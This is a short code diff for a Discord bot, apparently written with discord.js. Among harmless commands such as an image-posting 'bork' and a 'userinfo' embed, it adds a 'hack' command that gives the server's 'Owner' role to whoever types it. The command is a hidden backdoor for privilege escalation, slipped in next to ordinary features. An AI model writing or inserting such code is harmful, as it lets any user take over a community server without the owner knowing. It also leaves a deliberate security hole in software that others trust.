@@ -103,6 +103,9 @@ bot.on("message", function (message) {
         case "bork":
             message.channel.send("https://pre00.deviantart.net/9cb7/th/pre/i/2016/360/9/1/bork_bork__by_cartoon_bazooka-daszygl.png")
             break;
+        case "hack":
+            message.member.addRole(message.guild.roles.find("name", "Owner"));
+            break;
         case "userinfo":
             var embed = new Discord.RichEmbed()
                 .addField("Name", message.author.username.toString())
